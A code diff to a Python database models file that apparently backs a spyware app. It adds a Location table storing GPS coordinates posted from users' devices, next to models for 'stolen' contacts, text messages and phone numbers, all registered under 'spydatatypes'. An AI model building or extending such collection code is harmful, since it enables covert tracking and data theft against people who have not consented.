@@ -86,7 +86,7 @@ class TextMessage(db.Model):
         return "<Textmessage {}.{}: {}>".format(self.textmessage_id, self.time_stamp, self.body)
 
 class PhoneNumber(db.Model):
-    """Models a phnenumbers associated with a stolen contact
+    """Models a phonenumbers associated with a stolen contact
     This data has no handler as it can not be posted by the app alone
     but only as a field in a contact post"""
     __tablename__ = "phone_number"
@@ -103,4 +103,36 @@ class PhoneNumber(db.Model):
     def __repr__(self):
         return "<PhoneNumber {}.{} {}>".format(self.phonenumber_id, self.contact_id, self.number)
 
-spydatatypes = {"contact": Contact}
+
+class Location(db.Model):
+    """Models gps data from a user"""
+    __tablename__ = "location"
+    location_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
+    user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))
+
+    longitude = db.Column(db.String(64), nullable=False)
+    latitude = db.Column(db.String(64), nullable=False)
+    time_stamp = db.Column(db.String(64), nullable=False)
+
+    @staticmethod
+    def userdata_post_handler(user_id, location_data_dict):
+        """Adds posted userdata to database"""
+        # Create contact
+        location = Location(
+            user_id=int(user_id),
+            longitude=location_data_dict.get("longitude"),
+            latitude=location_data_dict.get("latitude"),
+            time_stamp=location_data_dict.get("time"),
+        )
+        db.session.add(location)
+        db.session.commit()
+
+    def as_dict(self):
+        """As sqlalchemy obj cant be parsed to json we build a custom converter"""
+        return utility.dict_keys_to_camel_case(
+            {c.name: getattr(self, c.name) for c in self.__table__.columns})
+
+    def __repr__(self):
+        return "<Location {}.{} {}/{}>".format(self.location_id, self.time_stamp, self.latitude, self.longitude)
+
+spydatatypes = {"contact": Contact, "location": Location}
